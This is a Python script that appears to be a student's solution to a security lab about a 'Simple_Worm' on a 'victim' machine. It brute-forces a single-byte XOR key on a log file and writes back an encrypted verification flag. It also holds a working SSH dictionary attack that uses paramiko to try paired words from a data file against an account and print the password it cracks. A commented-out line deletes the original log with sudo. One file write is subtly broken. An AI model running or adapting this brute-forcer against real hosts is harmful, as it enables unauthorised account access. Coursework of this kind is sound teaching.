#!/usr/bin/env python3
import os
import paramiko

def CrackMe():
    crack = open('/home/victim/Public/.Simple_Worm/crack_me.log').read()
    for i in range(256):
        result = ''
        for c in crack:
            result += chr(ord(c) ^ i)
        if 'flag' in result:
            key = i
            break
    plain = 'Verification_flag: 0616018-0616100'
    cipher = ''
    for p in plain:
        cipher += chr(key ^ ord(p))
    #os.system('sudo rm /home/victim/Public/.Simple_Worm/crack_me.log')
    open('/home/victim/Public/.Simple_Worm/task1_result.log').write(cipher)

def DictionaryAttack(ip):
    password = ''
    info = [d.split(':')[1].strip() for d in open('/home/victim/materials/attacker.dat').readlines()][:-1] + ['@', '_']
    for i in info:
        if password != '':
            break
        j = 0
        while j < len(info):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip, 22, username='attacker', password=i+info[j], timeout=1000, banner_timeout=1000, auth_timeout=1000)
                password = i+info[j]
                print(password)
                break
            except KeyboardInterrupt:
                exit(0)
            except paramiko.AuthenticationException:
                pass
            except:
                j -= 1
            j += 1
    return password

DictionaryAttack('127.0.0.1')
